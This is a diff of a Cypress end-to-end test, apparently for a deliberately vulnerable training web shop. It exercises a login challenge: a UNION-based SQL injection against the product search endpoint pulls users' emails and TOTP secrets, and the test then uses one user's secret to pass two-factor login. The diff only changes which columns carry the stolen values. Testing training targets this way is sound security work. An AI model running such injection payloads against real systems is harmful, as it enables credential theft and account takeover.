@@ -123,9 +123,9 @@ describe('/#/login', () => {
         }
       )
 
-      cy.request("/rest/products/search?q=')) union select id,'2','3',email,totpSecret,'6','7','8','9' from users--").then((response) => {
-        const wurstbrot = response.body.data.find((row: { price: string }) => row.price.startsWith('wurstbrot@'))
-        cy.task<string>('GenerateAuthenticator', wurstbrot.deluxePrice).then(
+      cy.request("/rest/products/search?q=')) union select id,email,totpSecret,'4','5','6','7','8','9' from users--").then((response) => {
+        const wurstbrot = response.body.data.find((row: { name: string }) => row.name.startsWith('wurstbrot@'))
+        cy.task<string>('GenerateAuthenticator', wurstbrot.description).then(
           (totpToken: string) => {
             void cy.get('#totpToken').type(totpToken)
             void cy.get('#totpSubmitButton').click()
